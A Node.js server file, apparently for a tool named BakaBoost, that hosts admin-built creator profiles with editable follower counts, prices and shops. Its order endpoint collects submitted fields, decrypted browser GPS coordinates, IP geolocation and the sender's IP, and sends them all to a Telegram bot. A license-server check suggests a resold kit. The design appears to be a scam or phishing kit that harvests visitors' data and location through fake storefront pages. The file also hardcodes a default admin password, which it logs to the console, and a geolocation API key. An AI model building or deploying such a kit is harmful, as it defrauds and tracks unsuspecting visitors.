const http = require("http");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const PORT = process.env.PORT || 3005;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const LICENSE_SERVER_URL = process.env.LICENSE_SERVER_URL;
const CLIENT_ID = process.env.CLIENT_ID || "default";
const TOKEN_SECRET = process.env.TOKEN_SECRET || crypto.randomBytes(32).toString("hex");
const TOKEN_TTL = 5 * 60 * 1000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "bakaboost2025";
const PROFILES_PATH = path.join(__dirname, "profiles.json");

const { publicKey: RSA_PUBLIC_KEY, privateKey: RSA_PRIVATE_KEY } = crypto.generateKeyPairSync("rsa", {
  modulusLength: 2048,
  publicKeyEncoding: { type: "spki", format: "pem" },
  privateKeyEncoding: { type: "pkcs8", format: "pem" },
});

const adminSessions = new Map();
const SESSION_TTL = 24 * 60 * 60 * 1000;

function createAdminSession() {
  const id = crypto.randomBytes(32).toString("hex");
  adminSessions.set(id, { created: Date.now() });
  return id;
}

function isValidAdminSession(id) {
  if (!id) return false;
  const session = adminSessions.get(id);
  if (!session) return false;
  if (Date.now() - session.created > SESSION_TTL) {
    adminSessions.delete(id);
    return false;
  }
  return true;
}

function getAdminSessionFromCookie(req) {
  const cookieHeader = req.headers.cookie || "";
  const match = cookieHeader.match(/baka_admin_session=([^;]+)/);
  return match ? match[1] : null;
}

function loadProfiles() {
  try {
    return JSON.parse(fs.readFileSync(PROFILES_PATH, "utf8"));
  } catch {
    return {};
  }
}

function saveProfiles(profiles) {
  fs.writeFileSync(PROFILES_PATH, JSON.stringify(profiles, null, 2), "utf8");
}

function createToken(ip) {
  const payload = { ip, ts: Date.now(), nonce: crypto.randomBytes(8).toString("hex") };
  const data = JSON.stringify(payload);
  const sig = crypto.createHmac("sha256", TOKEN_SECRET).update(data).digest("hex");
  return Buffer.from(JSON.stringify({ ...payload, sig })).toString("base64url");
}

function verifyToken(token, ip) {
  try {
    const parsed = JSON.parse(Buffer.from(token, "base64url").toString());
    const { ip: tokenIp, ts, nonce, sig } = parsed;
    if (tokenIp !== ip) return false;
    if (Date.now() - Number(ts) > TOKEN_TTL) return false;
    const data = JSON.stringify({ ip: tokenIp, ts, nonce });
    const expected = crypto.createHmac("sha256", TOKEN_SECRET).update(data).digest("hex");
    return crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected));
  } catch {
    return false;
  }
}

const MIME = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".gif": "image/gif",
  ".svg": "image/svg+xml",
};

function send(res, status, body, type = "text/plain; charset=utf-8") {
  res.writeHead(status, { "Content-Type": type });
  res.end(body);
}

function sendJson(res, status, obj) {
  res.writeHead(status, { "Content-Type": "application/json; charset=utf-8" });
  res.end(JSON.stringify(obj));
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
      if (body.length > 5_000_000) { reject(new Error("Body too large")); req.destroy(); }
    });
    req.on("end", () => resolve(body));
    req.on("error", reject);
  });
}

function getClientIp(req) {
  const xff = req.headers["x-forwarded-for"];
  if (typeof xff === "string" && xff.trim()) return xff.split(",")[0].trim();
  const addr = req.socket?.remoteAddress;
  if (typeof addr === "string" && addr.trim()) return addr.trim();
  return "Unknown";
}

function escHtml(s) {
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

async function getGeoFromIP(ip) {
  try {
    const apiKey = process.env.GEOIP_API_KEY || "fc87f3a8608049baa0be81bd00bb55cd";
    const url = `https://api.ipgeolocation.io/v3/ipgeo?apiKey=${apiKey}&ip=${ip}`;
    const response = await fetch(url);
    return await response.json();
  } catch { return null; }
}

function decryptLocation(encryptedBase64) {
  try {
    const decrypted = crypto.privateDecrypt(
      { key: RSA_PRIVATE_KEY, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: "sha256" },
      Buffer.from(encryptedBase64, "base64"),
    );
    return JSON.parse(decrypted.toString());
  } catch { return null; }
}

function serveProfilePage(res, profile) {
  const templatePath = path.join(__dirname, "profile-template.html");
  fs.readFile(templatePath, "utf8", (err, tmpl) => {
    if (err) { send(res, 500, "Profile template missing"); return; }
    const html = tmpl.replace("__PROFILE_DATA__", JSON.stringify(profile).replace(/<\/script>/gi, "<\\/script>"));
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(html);
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://localhost`);
  const pathname = url.pathname;

  res.setHeader("X-Content-Type-Options", "nosniff");

  if (req.method === "GET" && pathname === "/api/token") {
    const clientIp = getClientIp(req);
    const token = createToken(clientIp);
    sendJson(res, 200, { token });
    return;
  }

  if (req.method === "GET" && pathname === "/api/public-key") {
    sendJson(res, 200, { publicKey: RSA_PUBLIC_KEY });
    return;
  }

  if (req.method === "POST" && pathname === "/api/order") {
    try {
      const auth = req.headers["authorization"] || "";
      const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
      if (!token || !verifyToken(token, getClientIp(req))) {
        sendJson(res, 401, { message: "Unauthorized" });
        return;
      }
      const body = await readBody(req);
      const clientIp = getClientIp(req);
      const geoData = await getGeoFromIP(clientIp);

      let parsedBody;
      try { parsedBody = JSON.parse(body); } catch { parsedBody = {}; }

      let gpsLocation = null;
      if (parsedBody.encryptedLocation) {
        gpsLocation = decryptLocation(parsedBody.encryptedLocation);
        delete parsedBody.encryptedLocation;
      }

      const modifiedBody = JSON.stringify({ ...parsedBody, geoData });
      let payloadObj;
      try { payloadObj = JSON.parse(modifiedBody); } catch { payloadObj = null; }

      const fields = payloadObj?.embeds?.[0]?.fields || [];
      const title = payloadObj?.embeds?.[0]?.title || "New Order";
      const rows = [[`== ${title} ==`]];
      for (const f of fields) rows.push([`${f.name}: ${f.value}`]);
      if (gpsLocation) rows.push([`GPS: ${gpsLocation.lat}, ${gpsLocation.lng} (±${gpsLocation.accuracy}m)`]);
      const geoLoc = geoData?.location;
      if (geoLoc) rows.push([`IP Geo: ${geoLoc.latitude}, ${geoLoc.longitude}`]);
      rows.push([`Sender IP: ${clientIp}`]);
      rows.push([]);
      rows.push(["---"]);
      rows.push([`Timestamp: ${new Date().toISOString()}`]);

      if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        sendJson(res, 502, { message: "Telegram not configured" });
        return;
      }

      if (LICENSE_SERVER_URL) {
        const licRes = await fetch(`${LICENSE_SERVER_URL}/api/verify`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ clientId: CLIENT_ID }),
        });
        if (!licRes.ok) { sendJson(res, 403, { message: "License expired" }); return; }
      }

      const plainText = rows.map(r => r.join(" ")).join("\n");
      const htmlText = rows.map(r => r.join(" ")).map(escHtml).join("\n");

      const [msgRes, docRes] = await Promise.all([
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `<pre>${htmlText}</pre>`, parse_mode: "HTML", disable_web_page_preview: true }),
        }),
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
          method: "POST",
          body: (() => {
            const fd = new FormData();
            fd.append("chat_id", TELEGRAM_CHAT_ID);
            fd.append("document", new Blob([plainText], { type: "text/plain;charset=utf-8" }), "order.txt");
            return fd;
          })(),
        }),
      ]);

      if (!msgRes.ok || !docRes.ok) {
        const errs = [];
        if (!msgRes.ok) errs.push("message: " + (await msgRes.text().catch(() => "")));
        if (!docRes.ok) errs.push("document: " + (await docRes.text().catch(() => "")));
        sendJson(res, 502, { message: `Telegram error — ${errs.join("; ")}` });
        return;
      }

      sendJson(res, 200, { message: "Order sent" });
    } catch (error) {
      sendJson(res, 500, { message: error.message });
    }
    return;
  }

  if (pathname === "/api/admin/login" && req.method === "POST") {
    try {
      const body = await readBody(req);
      const { password } = JSON.parse(body);
      if (password === ADMIN_PASSWORD) {
        const sessionId = createAdminSession();
        res.writeHead(200, {
          "Content-Type": "application/json; charset=utf-8",
          "Set-Cookie": `baka_admin_session=${sessionId}; Path=/; HttpOnly; SameSite=Strict; Max-Age=86400`,
        });
        res.end(JSON.stringify({ ok: true }));
      } else {
        sendJson(res, 401, { ok: false, message: "Wrong password" });
      }
    } catch {
      sendJson(res, 400, { ok: false, message: "Bad request" });
    }
    return;
  }

  if (pathname === "/api/admin/logout" && req.method === "POST") {
    const sessionId = getAdminSessionFromCookie(req);
    if (sessionId) adminSessions.delete(sessionId);
    res.writeHead(200, {
      "Content-Type": "application/json; charset=utf-8",
      "Set-Cookie": "baka_admin_session=; Path=/; HttpOnly; SameSite=Strict; Max-Age=0",
    });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  if (pathname === "/api/admin/me" && req.method === "GET") {
    const sessionId = getAdminSessionFromCookie(req);
    sendJson(res, 200, { loggedIn: isValidAdminSession(sessionId) });
    return;
  }

  if (pathname === "/api/admin/profiles" && req.method === "GET") {
    const sessionId = getAdminSessionFromCookie(req);
    if (!isValidAdminSession(sessionId)) { sendJson(res, 401, { message: "Unauthorized" }); return; }
    sendJson(res, 200, loadProfiles());
    return;
  }

  if (pathname === "/api/admin/profiles" && req.method === "POST") {
    const sessionId = getAdminSessionFromCookie(req);
    if (!isValidAdminSession(sessionId)) { sendJson(res, 401, { message: "Unauthorized" }); return; }
    try {
      const body = await readBody(req);
      const data = JSON.parse(body);
      const username = (data.username || "").toLowerCase().replace(/[^a-z0-9_-]/g, "");
      if (!username) { sendJson(res, 400, { message: "Invalid username" }); return; }
      const profiles = loadProfiles();
      if (profiles[username]) { sendJson(res, 409, { message: "Username already exists" }); return; }
      profiles[username] = { username, displayName: data.displayName || username, bio: data.bio || "", pfp: data.pfp || "", banner: data.banner || "", followerCount: parseInt(data.followerCount) || 0, coffeePrice: parseFloat(data.coffeePrice) || 1, coffeeLabel: data.coffeeLabel || "coffee", gallery: data.gallery || [], posts: data.posts || [], shop: data.shop || [] };
      saveProfiles(profiles);
      sendJson(res, 201, profiles[username]);
    } catch (e) {
      sendJson(res, 400, { message: e.message });
    }
    return;
  }

  const profileEditMatch = pathname.match(/^\/api\/admin\/profiles\/([^/]+)$/);

  if (profileEditMatch && req.method === "PUT") {
    const sessionId = getAdminSessionFromCookie(req);
    if (!isValidAdminSession(sessionId)) { sendJson(res, 401, { message: "Unauthorized" }); return; }
    const oldUsername = profileEditMatch[1];
    try {
      const body = await readBody(req);
      const data = JSON.parse(body);
      const newUsername = (data.username || "").toLowerCase().replace(/[^a-z0-9_-]/g, "");
      if (!newUsername) { sendJson(res, 400, { message: "Invalid username" }); return; }
      const profiles = loadProfiles();
      if (!profiles[oldUsername]) { sendJson(res, 404, { message: "Profile not found" }); return; }
      if (newUsername !== oldUsername && profiles[newUsername]) { sendJson(res, 409, { message: "Username already exists" }); return; }
      const existing = profiles[oldUsername];
      if (newUsername !== oldUsername) {
        delete profiles[oldUsername];
      }
      profiles[newUsername] = {
        username: newUsername,
        displayName: data.displayName ?? existing.displayName,
        bio: data.bio ?? existing.bio,
        pfp: data.pfp ?? existing.pfp,
        banner: data.banner ?? existing.banner,
        followerCount: data.followerCount !== undefined ? parseInt(data.followerCount) : existing.followerCount,
        coffeePrice: data.coffeePrice !== undefined ? parseFloat(data.coffeePrice) : existing.coffeePrice,
        coffeeLabel: data.coffeeLabel ?? existing.coffeeLabel,
        gallery: data.gallery ?? existing.gallery,
        posts: data.posts ?? existing.posts,
        shop: data.shop ?? existing.shop,
      };
      saveProfiles(profiles);
      sendJson(res, 200, profiles[newUsername]);
    } catch (e) {
      sendJson(res, 400, { message: e.message });
    }
    return;
  }

  if (profileEditMatch && req.method === "DELETE") {
    const sessionId = getAdminSessionFromCookie(req);
    if (!isValidAdminSession(sessionId)) { sendJson(res, 401, { message: "Unauthorized" }); return; }
    const username = profileEditMatch[1];
    const profiles = loadProfiles();
    if (!profiles[username]) { sendJson(res, 404, { message: "Profile not found" }); return; }
    delete profiles[username];
    saveProfiles(profiles);
    sendJson(res, 200, { message: "Deleted" });
    return;
  }

  if (req.method !== "GET" && req.method !== "HEAD") {
    send(res, 405, "Method not allowed");
    return;
  }

  if (pathname === "/") {
    const homePath = path.join(__dirname, "homepage.html");
    fs.readFile(homePath, (err, data) => {
      if (err) { send(res, 500, "Homepage missing"); return; }
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(data);
    });
    return;
  }

  if (pathname === "/admin" || pathname === "/admin/") {
    const adminPath = path.join(__dirname, "admin.html");
    fs.readFile(adminPath, (err, data) => {
      if (err) { send(res, 500, "Admin panel missing"); return; }
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(data);
    });
    return;
  }

  const staticExtensions = [".html", ".css", ".js", ".json", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".txt", ".zip", ".woff", ".woff2"];
  const ext = path.extname(pathname).toLowerCase();
  if (ext && staticExtensions.includes(ext)) {
    const relativePath = pathname.replace(/^\/+/, "");
    const safePath = path.normalize(relativePath).replace(/^(\.\.[/\\])+/, "");
    const filePath = path.join(__dirname, safePath);
    if (!filePath.startsWith(__dirname)) { send(res, 403, "Forbidden"); return; }
    fs.readFile(filePath, (err, data) => {
      if (err) { send(res, 404, "Not found"); return; }
      res.writeHead(200, { "Content-Type": MIME[ext] || "application/octet-stream" });
      res.end(data);
    });
    return;
  }

  const usernameMatch = pathname.match(/^\/([a-zA-Z0-9_-]+)\/?$/);
  if (usernameMatch) {
    const username = usernameMatch[1].toLowerCase();
    const profiles = loadProfiles();
    if (profiles[username]) {
      serveProfilePage(res, profiles[username]);
      return;
    }
  }

  send(res, 404, "Not found");
});

server.listen(PORT, () => {
  console.log(`BakaBoost running at http://127.0.0.1:${PORT}`);
  console.log(`Admin panel: http://127.0.0.1:${PORT}/admin`);
  console.log(`Admin password: ${ADMIN_PASSWORD}`);
});
